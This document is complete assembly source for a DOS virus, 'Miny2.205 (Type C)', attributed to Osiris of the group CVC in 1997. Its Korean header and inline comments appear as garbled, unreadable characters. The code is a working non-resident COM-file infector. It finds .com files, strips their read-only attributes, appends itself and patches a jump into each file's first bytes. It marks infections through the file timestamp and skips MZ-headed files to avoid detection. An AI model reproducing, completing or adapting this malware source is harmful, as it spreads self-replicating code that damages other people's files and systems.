;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                                               CVC #02  97/09
; Virus Name : Miny2.205 (Type C)
; Author : Osiris
; Group : CVC
; Date : 1997/08/17
;
; Type : Non-resident COM infector
;
; Miny2 (Type B) �� �����e���a.
; COM �¸w�a�i �a�� EXE �a���i �q�q ��ǡ�� �g�e�a.
; �w��e EXE �a���e �������� MZ �i �a���a�� Ё�w�a���� MZ �� ���b�a�e �q�q��
; ǡ�� �g�e�a. �a�A 64 KB ���w�� �����i �a���e �a���� �q�q ��ǡ�� �g�e�a.
; COM �a���e �a�a�� �A�a���a�e �����a�� �����A 64 KB ���w�� �a���e ���� �i ��
; ���a.
;
; EXE �a���e COM �a�����e �a�������a �i���� �����A �q�q��ǡ�� ��Ё��e ��
; �a�e �w�� ϩ�a�a�a. �a��A ���� EXE �a���e COM �¸w�a�i �a�� �w���a ���a.
; (��:COMMAND.COM)
; �g�e �a����a�i�� �啡�� 95�A�� �b���i �A���� ���a�e ���A�� �a�a�a COMMAND.
; COM �i COM �w���a�� �q�q���a�� �a�� �����i ���១�e �������a.
;
; �b�� �g�e AV �i�A�A ���e�� �E�a. �a���e, Miny2 �� ����e ���w�� �����w �a����
; �a �A�b�󷡋� �����A �a���e ���e�i ϡ�a�� ���e �w��i �a�w�a�� �g�v�a.
; Type D ���� TBAV �� �������w�i ϡ�a�e �a����a�i �A�b�a�V�a.
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
            .MODEL  TINY
            .CODE

 Miny2:     nop                         ; �a�A���t (�a������ �e�e�a.)
            nop                         ; �|���� ������ �a����a�a �a�A�A��
            nop                         ; �����A �� �t�i �����a.
 start:
            call  Next                  ;
 Next:      pop   bp                    ;
            sub   bp,offset Next        ; BP = �a����a ���b����

            lea   si,COM_head[BP]       ;
            mov   di,100h               ; COM �� �|�����i �����e�a.
            push  di                    ;
            movsw                       ;
            movsb                       ;

            mov   cx,0080h              ; DTA �� �a�wЁ PSP �a �a�A�A�a��
            mov   si,0080h              ; �q�� ��w�e�a.
            lea   di,End_Virus[BP]      ;
            repz  movsb                 ;

            mov   ah,4Eh                ; �a�� �x��
            mov   cx,00100011B
            lea   dx,Match_COM[BP]
 Find:      int   21h
            jnc   ChkInfected           ;
 Restart:
            lea   si,End_Virus[BP]      ; ���� DTA ����
            mov   di,0080h
            mov   cx,0080h
            repz  movsb
            RET

 ChkInfected:                           ; �q�q �a���i �·��e�a.
            mov   al,DS:[0096h]         ; 62 �� ���� ��a�e�a.
            and   al,1Fh
            cmp   al,1Fh
            jnz   Infect
            mov   ah,4Fh                ; �a�q �a�� �x��
            jmp   Find
 Infect:
            mov   ax,4301h              ; ����/�a�� �����a�� �a��
            xor   cx,cx
            mov   dx,009Eh
            int   21h
            jc    Restart               ; �A�ᯡ �a�� �h��

            mov   ax,3D02h              ; �a�� ���e
            int   21h
            jc    Restart               ; Ѣ�� ���i ���e�� �A�ᕡ �១Ж�a.

            xchg  ax,bx                 ; �a�� Ѕ�i �苡

            mov   ax,5700h              ; �a�� �b�� ���e �苡
            int   21h
            push  cx                    ; �b�� ���e ��w
            push  dx                    ;

            mov   ah,3Fh                ; �|���� ����
            lea   dx,COM_Head[BP]       ; ���� ����
            mov   cx,0003               ; 3 �a���a
            int   21h
            cmp   byte ptr COM_Head[BP],'M' ; MZ ���a ?
            jnz   lseek2                ; TBAV �A ���e�e�A�� ��Ё�� �a�� ��a
            cmp   byte ptr COM_Head[BP+1],'Z' ; �e�a.
            jz    Error
 lseek2:
            mov   al,02                 ; �a�� �{�a�� ����
            call  lseek
            or    dx,dx                 ; 64 KB ���w���a ?
            jnz   Error                 ; �a�q ��a�� ���e ��ǡ�� �g����Ё��

            sub   ax,3                  ; ���a�t ���e
            mov   word ptr JumpCode[BP+1],ax     ;

            mov   ah,40h                ; �a����a �a��
            mov   cx,offset End_virus - 3 - 2
            lea   dx,start[BP]
            int   21h

            mov   al,00                 ; ��q�a�� ����
            call  lseek

            mov   ah,40h                ; ���a š�a �a��
            mov   cx,0003
            lea   dx,JumpCode[BP]
            int   21h

 Error:
            pop   dx                    ; �a�� �b�� ���e ����
            pop   cx                    ;
            or    cx,+1Fh               ; 62 ���� �e�i��
            mov   ax,5701h              ;
            int   21h

 Close:
            mov   ah,3Eh                ; �a�� �h��
            int   21h
            jmp   Restart

 lseek:                                 ; ͡���� ����
            xor   cx,cx
            xor   dx,dx
            mov   ah,42h
            int   21h
            ret

 COM_head   db    0CDh,20h,90h          ; COM �|����
 Match_COM  db    '*.com',00            ; COM �a�� �x��
            db    'Miny2'               ; ���� 2
 JumpCode   db    0E9h
            db    ?,?
 End_Virus:
            END   Miny2

